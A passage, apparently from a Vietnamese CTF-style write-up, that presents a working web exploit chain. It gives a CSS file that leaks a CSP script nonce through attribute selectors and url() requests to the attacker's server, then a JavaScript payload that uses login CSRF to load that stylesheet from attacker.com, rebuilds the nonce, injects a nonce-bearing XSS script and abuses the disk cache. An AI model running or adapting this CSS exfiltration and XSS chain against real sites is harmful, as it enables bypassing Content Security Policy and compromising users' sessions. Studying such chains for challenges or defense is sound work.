...
File CSS trên server atk:
```css
*{display: block}
script[nonce*="000"]{--000:url(/l/000)}
script[nonce*="001"]{--001:url(/l/001)}
/* ... tất cả combinations của hex 3 ký tự ... */
script[nonce*="fff"]{--fff:url(/l/fff)}
script {
  background: var(--000,none),var(--001,none),...,var(--fff,none)
}
```
Payload cuối cùng 
```css
async function exploit() {
  ...
  // Bước 1: Leak nonce qua CSS
  login_csrf(`<link rel="stylesheet" href="http://attacker.com/leak.css">`);
  await sleep(1000);
  w.location = "http://localhost:3000/dashboard?xss";
  await sleep(1000);
  
  // Bước 2: Reconstruct nonce từ leaks
  const nonces = await fetch("/nonce").then(r => r.json());
  
  // Bước 3: CSRF với XSS payload chứa nonce đã biết
  login_csrf(`<iframe srcdoc="<script nonce='${nonces[0]}'>alert(origin)<\/script>"></iframe>`);
  await sleep(1000);
  
  // Bước 4: Trigger Disk Cache
  w.location = "http://localhost:3000/dashboard";
  await sleep(1000);
  w.location = "http://attacker.com/back?n=3";
}
